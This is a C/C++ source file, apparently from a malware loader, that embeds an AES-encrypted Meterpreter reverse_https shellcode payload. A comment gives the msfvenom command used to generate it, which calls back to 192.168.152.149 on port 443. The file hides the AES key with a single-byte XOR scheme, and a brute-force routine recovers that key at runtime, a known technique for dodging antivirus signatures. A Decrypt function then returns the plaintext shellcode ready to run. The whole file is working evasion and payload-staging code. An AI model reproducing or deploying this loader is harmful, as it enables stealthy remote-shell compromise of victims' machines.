#include "aes.hpp"

#if AESDEBUG
#include "time.h"
#include "stdio.h"
#endif // DEBUG


//msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.152.149 LPORT=443 EXITFUNC=thread -f c > met_reverse_https_thread_149.bin
unsigned char AesCipherText[] = {
        0xB9, 0x68, 0x66, 0x5E, 0x96, 0x0E, 0x36, 0xE4, 0x26, 0xF0, 0x69, 0x72, 0x5E, 0xBC, 0x67, 0x74,
        0xEA, 0x24, 0x51, 0x15, 0xB6, 0xAC, 0xCE, 0xA7, 0xBD, 0xA1, 0x15, 0x42, 0x81, 0xC4, 0xDA, 0xF0,
        0xDF, 0x0E, 0x4D, 0x66, 0x5B, 0x76, 0x08, 0x6D, 0xFF, 0xCA, 0x97, 0x73, 0x25, 0x56, 0x05, 0x57,
        0x47, 0x5F, 0xA6, 0x16, 0xFD, 0x9C, 0x36, 0x9E, 0x8E, 0x3B, 0x07, 0xAA, 0x14, 0x57, 0x7E, 0x58,
        0x9B, 0x4B, 0x28, 0xE2, 0xE3, 0x10, 0xEB, 0x4D, 0x27, 0x19, 0xDC, 0x92, 0x07, 0x6F, 0xC9, 0x6B,
        0x3C, 0xA6, 0x6F, 0x56, 0xC1, 0xEA, 0x81, 0xC0, 0xFC, 0xFB, 0x67, 0x7E, 0x29, 0x75, 0xC8, 0xF1,
        0xE9, 0xC1, 0x6E, 0xAD, 0x2D, 0x8C, 0xBA, 0xED, 0x50, 0xB5, 0x81, 0x8C, 0x71, 0xA4, 0x83, 0x5D,
        0x27, 0x64, 0x00, 0xCF, 0xC3, 0xC1, 0xCB, 0x64, 0xD2, 0xA0, 0x77, 0xA5, 0x07, 0x9A, 0xB4, 0xE4,
        0xDB, 0x1C, 0x23, 0x9F, 0xB7, 0x2F, 0xF8, 0x8A, 0x93, 0xFB, 0xB2, 0xED, 0xFD, 0x40, 0x19, 0xBD,
        0x80, 0x0D, 0x60, 0x2D, 0x73, 0x45, 0xD0, 0x2D, 0xCC, 0xED, 0x37, 0x8D, 0x1C, 0x00, 0x3D, 0xF7,
        0x6F, 0x9D, 0x75, 0x39, 0x67, 0x98, 0x49, 0x39, 0x72, 0xA6, 0xC4, 0x9A, 0x93, 0xDD, 0x3A, 0xBD,
        0x67, 0x6D, 0x9F, 0xDE, 0x80, 0x02, 0xF2, 0xAE, 0x2F, 0x17, 0x8D, 0x44, 0xE9, 0xD8, 0xBA, 0x98,
        0x8E, 0xF2, 0xD9, 0x65, 0xB9, 0x8D, 0x23, 0x4C, 0x6B, 0x26, 0x8B, 0xA4, 0xDF, 0x5B, 0x76, 0xDB,
        0x04, 0x20, 0x2B, 0xD6, 0xCE, 0x9C, 0xFD, 0xF0, 0xE8, 0x99, 0x98, 0x1D, 0xC0, 0xDB, 0x30, 0xC9,
        0x2B, 0xD4, 0x78, 0xB7, 0x33, 0x1D, 0xDE, 0x2A, 0x4D, 0x2F, 0x80, 0x92, 0x82, 0x8F, 0x43, 0xE9,
        0xE3, 0xE0, 0x0E, 0xF9, 0x8A, 0xF8, 0xA2, 0x16, 0xFA, 0x58, 0xD3, 0xF2, 0x4D, 0x46, 0xA5, 0x09,
        0xE0, 0x36, 0xD3, 0x7F, 0x64, 0xAA, 0x0B, 0x09, 0x97, 0xFE, 0x12, 0x1B, 0xEE, 0x98, 0x71, 0x24,
        0xD9, 0x97, 0x73, 0xD9, 0x84, 0xC5, 0xB4, 0x1B, 0x8C, 0x56, 0x1D, 0xDE, 0x02, 0xE8, 0xD5, 0x9B,
        0x65, 0xB2, 0xFE, 0x8E, 0xD8, 0xF4, 0x51, 0xAC, 0x8F, 0x47, 0x02, 0xEF, 0x2E, 0x56, 0x0B, 0xC9,
        0xE4, 0x66, 0x29, 0x92, 0x3D, 0x5E, 0x14, 0xFB, 0x38, 0x34, 0xBE, 0x57, 0x7D, 0xCD, 0x83, 0xB6,
        0x0D, 0xFB, 0x43, 0x53, 0x47, 0xA9, 0xD4, 0x63, 0x2D, 0x73, 0x8E, 0x4E, 0xA6, 0x09, 0xAA, 0x8C,
        0x59, 0x91, 0x6F, 0xED, 0x92, 0xF0, 0x3F, 0xD4, 0x57, 0x55, 0x2E, 0x03, 0x75, 0x44, 0x7F, 0xE7,
        0xBA, 0x55, 0x3E, 0x67, 0xE8, 0xDE, 0xF2, 0x41, 0xDB, 0x4A, 0x3B, 0x8E, 0x81, 0xB1, 0x6B, 0xEE,
        0xE8, 0x21, 0x84, 0x58, 0x8B, 0x89, 0xF3, 0x94, 0x37, 0x0D, 0x0D, 0x6A, 0xAC, 0x6B, 0xC1, 0x8D,
        0xA6, 0xCC, 0x68, 0x72, 0x49, 0x24, 0xCF, 0x1B, 0x7E, 0xE7, 0xEB, 0xC9, 0x69, 0x1F, 0xA3, 0x94,
        0xB0, 0x82, 0xEC, 0x5E, 0x66, 0xFA, 0x5B, 0xAF, 0x0D, 0xDF, 0xD3, 0x52, 0xFA, 0x9B, 0x05, 0x23,
        0x84, 0x6F, 0x27, 0x5F, 0x7C, 0x2B, 0x74, 0x3A, 0x1A, 0xD8, 0x5A, 0x3D, 0xEB, 0xFD, 0x35, 0x97,
        0x15, 0xCE, 0xE8, 0xA5, 0xBB, 0x3C, 0x19, 0x65, 0xAE, 0xB2, 0xCB, 0xDB, 0xEF, 0x66, 0x43, 0xC4,
        0x5F, 0x71, 0x24, 0x4E, 0x38, 0xE0, 0xC9, 0x72, 0x9A, 0x2A, 0xF3, 0x59, 0x42, 0x93, 0x75, 0x8A,
        0xC1, 0x38, 0xF6, 0x06, 0xBD, 0x61, 0x81, 0x03, 0x59, 0x26, 0x65, 0x35, 0x5A, 0x7E, 0x77, 0x85,
        0xBD, 0xE7, 0x8E, 0x1B, 0xF0, 0x79, 0xC5, 0xD6, 0xA6, 0xD9, 0x41, 0xA2, 0x2E, 0x96, 0x37, 0x35,
        0x2C, 0x8F, 0x8B, 0x6E, 0xAB, 0x29, 0xD1, 0xD4, 0x1B, 0x51, 0x10, 0x65, 0xC4, 0xA9, 0x23, 0xA4,
        0x6E, 0x3B, 0x56, 0x99, 0xC5, 0x6C, 0xED, 0x52, 0x04, 0x28, 0x97, 0x69, 0x7C, 0xCE, 0x16, 0xE4,
        0x8B, 0xE7, 0x9B, 0x0E, 0xC1, 0x71, 0x82, 0xA1, 0xCB, 0x52, 0x81, 0x0B, 0x25, 0xA8, 0x7A, 0x7C,
        0x7E, 0x00, 0x8C, 0x20, 0xC7, 0xCC, 0x2A, 0xD1, 0x18, 0x7A, 0x98, 0x0B, 0x74, 0x8A, 0x1A, 0xF0,
        0xF0, 0xE5, 0x6F, 0x67, 0xAE, 0xCD, 0x23, 0x33, 0xC4, 0x3D, 0x93, 0x69, 0x50, 0xFC, 0x43, 0x5B,
        0x16, 0xCC, 0x68, 0x06, 0x14, 0x99, 0x3F, 0x7F, 0xF0, 0x60, 0x91, 0xEC, 0x03, 0x67, 0x70, 0xA3,
        0x2B, 0x72, 0x1E, 0x9F, 0xA4, 0xFF, 0x14, 0x6D, 0x1A, 0x3D, 0x49, 0xFA, 0x31, 0x96, 0x8C, 0x7D,
        0xAB, 0x7E, 0x25, 0x37, 0x82, 0x0F, 0x53, 0xD0, 0xDA, 0x89, 0xE8, 0x46, 0x4E, 0xD1, 0xEB, 0x3C,
        0x96, 0x47, 0xB9, 0x7F, 0x03, 0xBA, 0x9D, 0xCE, 0xEF, 0x90, 0x4F, 0xE3, 0xEC, 0x7A, 0xF3, 0xDE,
        0xF5, 0xDF, 0x4A, 0xB7, 0x37, 0xAA, 0x61, 0x55, 0x86, 0xD4, 0xCF, 0x1E, 0xD9, 0xE5, 0xB4, 0x0B,
        0x27, 0xF5, 0x1A, 0xAA, 0x0F, 0x52, 0x93, 0x3B, 0xCD, 0xFB, 0x3B, 0x87, 0x91, 0x6D, 0x0A, 0xFB,
        0x9B, 0x2C, 0x50, 0x93, 0x7A, 0xE9, 0xF1, 0x0C, 0x9C, 0xE3, 0xDA, 0x02, 0x7B, 0x78, 0x96, 0x87 };


#define OriginalKeyByte 0xFA
#define EncryptionByteIndex 27
unsigned char EncryptedKey[] = {
        0x83, 0x3F, 0x39, 0x7B, 0x1F, 0x04, 0x39, 0xD9, 0x4F, 0x76, 0xFA, 0xC3, 0xD6, 0x0E, 0x61, 0xD7,
        0x1B, 0x9E, 0xA1, 0xC3, 0xCB, 0x6D, 0x5A, 0x48, 0xAB, 0xE3, 0xEF, 0x7F, 0xFC, 0x11, 0xBE, 0x5B };

#if AESDEBUG
unsigned char AesKey[32] = {
        0xE9, 0x54, 0x51, 0x0E, 0x71, 0x69, 0x4D, 0xAC, 0x1D, 0x13, 0x86, 0x9E, 0xB0, 0x57, 0xFD, 0xAE,
        0x61, 0xE3, 0xB9, 0x96, 0x8D, 0xF2, 0x1A, 0x0B, 0xA9, 0x70, 0x6B, 0xFA, 0x7A, 0x5E, 0xB6, 0x12 };
#endif // DEBUG

unsigned char AesIv[] = {
        0x9B, 0xBD, 0xE6, 0xF0, 0xB1, 0x83, 0xBD, 0x2B, 0x00, 0xD0, 0x62, 0xD8, 0x65, 0xA3, 0x28, 0x0F };

// Print the input buffer as a hex char array
#if AESDEBUG

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

    printf("unsigned char %s[] = {", Name);

    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        if (i < Size - 1) {
            printf("0x%0.2X, ", Data[i]);
        }
        else {
            printf("0x%0.2X ", Data[i]);
        }
    }
    printf("};\n\n\n");
}

VOID GenerateProtectedKey(IN PBYTE pbPlainTextKey, IN SIZE_T dwKeySize, IN BYTE HintByteIndex, OUT PBYTE* ppbProtectedKey)
{
    //Genrate seed based on currnet time.
    srand(time(NULL));
    
    //generate the byte that will encrypt out plaintext key.
    BYTE encByte = (rand() % 0xFF) + 1;

    //create memory space for our encrypted key.
    PBYTE pbProtectedKey = (PBYTE)malloc(dwKeySize);
    if (pbProtectedKey == NULL)
        return;
    
    //encrypt out key using xor and the encryption byte.
    for (int i = 0; i < dwKeySize; i++)
    {
        if (i == HintByteIndex)
        {
            printf("#define OriginalKeyByte 0x%0.2X\n", pbPlainTextKey[i]);
        }
        pbProtectedKey[i] = (BYTE)((pbPlainTextKey[i] + i) ^ encByte);
    }

    *ppbProtectedKey = pbProtectedKey;
    printf("#define EncryptionByteIndex %d\n", HintByteIndex);
}

#endif // DEBUG

BYTE BruteForceDecryption(IN BYTE HintByte, IN INT HintByteIndex, IN PBYTE pEncryptedKey, IN SIZE_T dwKeySize, OUT PBYTE* ppEncryptedKey)
{
    BYTE encByte = 0;
    PBYTE pDecryptedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dwKeySize));

    if (!pDecryptedKey)
        return NULL;

    while (1)
    {
        if (encByte == 0xFF)
            return NULL;
        BYTE decryptedByte = (pEncryptedKey[HintByteIndex] ^ encByte) - HintByteIndex;
        if (decryptedByte == HintByte)
            break;
        else
            encByte++;
    }

    for (int i = 0; i < dwKeySize; i++)
    {
        pDecryptedKey[i] = (BYTE)((pEncryptedKey[i] ^ encByte) - i);
    }

    *ppEncryptedKey = pDecryptedKey;

    return encByte;
}

unsigned char* Decrypt()
{
   
#if AESDEBUG
    srand(time(NULL));
    PBYTE protectedKey;
    GenerateProtectedKey(AesKey, sizeof(AesKey), rand() % sizeof(AesKey), &protectedKey);
    PrintHexData("EncryptedKey", protectedKey, sizeof(AesKey));
#endif // DEBUG

    PBYTE AesKey;
    if(BruteForceDecryption(OriginalKeyByte, EncryptionByteIndex, EncryptedKey, sizeof(EncryptedKey), &AesKey) == NULL)
        return NULL;

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, AesKey, AesIv);

    AES_CBC_decrypt_buffer(&ctx, AesCipherText, sizeof(AesCipherText));

    if(AesKey)
        HeapFree(GetProcessHeap(), 0, (LPVOID)AesKey);

    return AesCipherText;
}

